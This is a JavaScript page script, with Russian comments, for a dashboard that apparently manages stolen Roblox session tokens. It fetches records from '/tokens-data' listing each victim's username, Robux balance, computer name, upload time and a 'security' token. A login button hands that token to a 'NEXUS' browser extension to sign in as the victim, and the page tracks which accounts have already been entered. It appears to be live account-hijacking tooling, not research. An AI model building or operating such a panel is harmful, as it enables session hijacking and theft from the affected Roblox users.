// ── История уведомлений ───────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('notifications');
bindLogout();

let notifHistory = [];
let currentFilter = 'all'; // 'all' | 'new' | 'visited'
let searchQuery = '';

// ── Загрузка истории ──────────────────────────────────────────────────────────
async function loadNotificationHistory() {
  try {
    const raw = localStorage.getItem('ft_notifications_history');
    if (raw) {
      notifHistory = JSON.parse(raw);
    } else {
      notifHistory = [];
      await syncWithTokens(false);
    }
  } catch (e) {
    notifHistory = [];
  }

  updateStats();
  renderHistoryList();
}

// ── Синхронизация с сервером ──────────────────────────────────────────────────
async function syncWithTokens(showToast = true) {
  try {
    const resp = await apiFetch('/tokens-data');
    if (resp.ok) {
      const tokens = await resp.json();
      if (Array.isArray(tokens)) {
        let addedCount = 0;
        tokens.forEach(t => {
          if (!t.valid) return;
          const lastLogin = t.lastLogin 
            || (t.file ? localStorage.getItem('login_' + t.file) : null)
            || (t.userId ? localStorage.getItem('login_user_' + t.userId) : null)
            || (t.username ? localStorage.getItem('login_user_' + t.username.toLowerCase()) : null);

          const statusInfo = formatAccountLoginStatus(lastLogin);

          const exists = notifHistory.some(h => (h.userId && h.userId === t.userId) || (h.username === (t.username || t.user)));
          if (!exists) {
            notifHistory.push({
              id: 'sync_' + (t.file || t.userId || Math.random().toString(36).substr(2, 6)),
              username: t.username || t.user || 'Roblox User',
              userId: t.userId || null,
              robux: Number(t.robux) || 0,
              computer: t.computer || '—',
              security: t.security || null,
              file: t.file || null,
              lastLogin: lastLogin,
              isNew: statusInfo.isNew,
              statusText: statusInfo.text,
              receivedAt: t.uploadedAt ? new Date(t.uploadedAt).getTime() : Date.now()
            });
            addedCount++;
          }
        });

        // Сортируем по времени получения (свежие вверху)
        notifHistory.sort((a, b) => (b.receivedAt || 0) - (a.receivedAt || 0));
        localStorage.setItem('ft_notifications_history', JSON.stringify(notifHistory));
        if (showToast) toast('Синхронизировано: добавлено ' + addedCount + ' записей');
        updateStats();
        renderHistoryList();
      }
    }
  } catch (e) {
    if (showToast && e.message !== 'auth') toast('Ошибка синхронизации', 'err');
  }
}

// ── Обновление статистики ─────────────────────────────────────────────────────
function updateStats() {
  const newCount = notifHistory.filter(n => n.isNew).length;
  const visitedCount = notifHistory.filter(n => !n.isNew).length;
  const activeCount = notifHistory.length;

  const elNew = document.getElementById('sNotifNew');
  const elVisited = document.getElementById('sNotifVisited');
  const elActive = document.getElementById('sNotifActive');

  if (elNew) elNew.textContent = newCount;
  if (elVisited) elVisited.textContent = visitedCount;
  if (elActive) elActive.textContent = activeCount;
}

// ── Отрисовка списка ──────────────────────────────────────────────────────────
function renderHistoryList() {
  const container = document.getElementById('notificationsFeed');
  if (!container) return;

  let list = [...notifHistory];

  if (currentFilter === 'new') {
    list = list.filter(n => n.isNew);
  } else if (currentFilter === 'visited') {
    list = list.filter(n => !n.isNew);
  }

  if (searchQuery) {
    const q = searchQuery.toLowerCase();
    list = list.filter(n => 
      (n.username && n.username.toLowerCase().includes(q)) || 
      (n.computer && n.computer.toLowerCase().includes(q))
    );
  }

  if (!list.length) {
    container.innerHTML = '<div class="empty" style="padding: 3rem 1rem;">Уведомлений не найдено</div>';
    return;
  }

  let html = '';
  list.forEach((n, idx) => {
    const username = escapeHtml(n.username || 'Roblox User');
    const pc = escapeHtml(n.computer || '—');
    const robux = Number(n.robux) || 0;
    const robuxStr = robux > 0 ? robux.toLocaleString() + ' R$' : '0 R$';
    const timeStr = n.receivedAt ? fmtDate(n.receivedAt) : '—';
    
    // Пересчитываем актуальный статус на случай если пользователь заходил недавно
    const lastLogin = n.lastLogin 
      || (n.file ? localStorage.getItem('login_' + n.file) : null)
      || (n.userId ? localStorage.getItem('login_user_' + n.userId) : null)
      || (n.username ? localStorage.getItem('login_user_' + n.username.toLowerCase()) : null);

    const statusInfo = formatAccountLoginStatus(lastLogin);
    const badgeClass = statusInfo.isNew ? 'token-notif-badge-new' : 'token-notif-badge-old';

    let avatarHtml = `<div class="notif-feed-avatar"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg></div>`;
    if (n.userId) {
      avatarHtml = `<div class="notif-feed-avatar"><img src="${API_BASE}/avatar-proxy/${n.userId}" onerror="this.outerHTML='<div class=\\'notif-feed-avatar\\'>O</div>'"></div>`;
    }

    let loginBtnHtml = '';
    if (n.security) {
      const tokenEscaped = escapeHtml(n.security).replace(/'/g, "\\'");
      const fileEscaped = escapeHtml(n.file || '').replace(/'/g, "\\'");
      loginBtnHtml = `<button class="btn-login btn-login-large" onclick="loginFromNotif('${tokenEscaped}', this, '${fileEscaped}', '${n.id}')">Войти</button>`;
    }

    html += `
      <div class="notif-feed-card">
        <div class="notif-feed-left">
          ${avatarHtml}
          <div class="notif-feed-info">
            <div class="notif-feed-username">${username}</div>
            <div class="notif-feed-meta">
              <span class="notif-meta-pc">ПК: <b>${pc}</b></span>
              <span class="notif-meta-sep">•</span>
              <span class="notif-meta-time">Получено: <b>${timeStr}</b></span>
            </div>
          </div>
        </div>

        <div class="notif-feed-center">
          <span class="${badgeClass}">${escapeHtml(statusInfo.text)}</span>
        </div>

        <div class="notif-feed-right">
          <div class="token-notif-robux">${robuxStr}</div>
          ${loginBtnHtml}
          <button class="btn-secondary notif-del-btn" title="Удалить" onclick="deleteNotifRecord('${n.id}')">✕</button>
        </div>
      </div>
    `;
  });

  container.innerHTML = html;
}

// ── Вход в Roblox из уведомления ──────────────────────────────────────────────
function loginFromNotif(token, btn, fileId, notifId) {
  if (!token) return;
  btn.textContent = 'Вход...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        const nowTs = Date.now();
        if (fileId) {
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId, timestamp: nowTs })
          }).catch(()=>{});
          localStorage.setItem('login_' + fileId, String(nowTs));
        }

        const notif = notifHistory.find(n => n.id === notifId);
        if (notif) {
          notif.lastLogin = nowTs;
          notif.isNew = false;
          notif.statusText = 'Был вход только что';
          if (notif.userId) localStorage.setItem('login_user_' + notif.userId, String(nowTs));
          if (notif.username) localStorage.setItem('login_user_' + notif.username.toLowerCase(), String(nowTs));
          localStorage.setItem('ft_notifications_history', JSON.stringify(notifHistory));
        }

        btn.textContent = 'Вошли';
        btn.className = 'btn-login logged-in btn-sm';
        btn.disabled = false;
        toast('Вход выполнен, открываем Roblox...');
        updateStats();
        renderHistoryList();
      } else {
        btn.textContent = 'Войти';
        btn.disabled = false;
        toast('Установите расширение NEXUS для входа', 'err');
      }
    }
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    btn.textContent = 'Войти';
    btn.disabled = false;
    toast('Установите расширение NEXUS для входа', 'err');
  }, 800);
}

// ── Удаление записи из истории ────────────────────────────────────────────────
function deleteNotifRecord(id) {
  notifHistory = notifHistory.filter(n => n.id !== id);
  localStorage.setItem('ft_notifications_history', JSON.stringify(notifHistory));
  updateStats();
  renderHistoryList();
  toast('Уведомление удалено');
}

// ── Очистка всей истории ──────────────────────────────────────────────────────
document.getElementById('btnClearHistory')?.addEventListener('click', () => {
  if (!confirm('Вы уверены, что хотите очистить всю историю уведомлений?')) return;
  notifHistory = [];
  localStorage.removeItem('ft_notifications_history');
  updateStats();
  renderHistoryList();
  toast('История уведомлений очищена');
});

// ── Синхронизация по кнопке ───────────────────────────────────────────────────
document.getElementById('btnSyncTokens')?.addEventListener('click', () => syncWithTokens(true));

// ── Фильтрация ────────────────────────────────────────────────────────────────
document.getElementById('filterAll')?.addEventListener('click', function() {
  currentFilter = 'all';
  document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
  this.classList.add('active');
  renderHistoryList();
});

document.getElementById('filterNew')?.addEventListener('click', function() {
  currentFilter = 'new';
  document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
  this.classList.add('active');
  renderHistoryList();
});

document.getElementById('filterVisited')?.addEventListener('click', function() {
  currentFilter = 'visited';
  document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
  this.classList.add('active');
  renderHistoryList();
});

document.getElementById('notifSearchInput')?.addEventListener('input', function() {
  searchQuery = this.value.trim();
  renderHistoryList();
});

loadNotificationHistory();
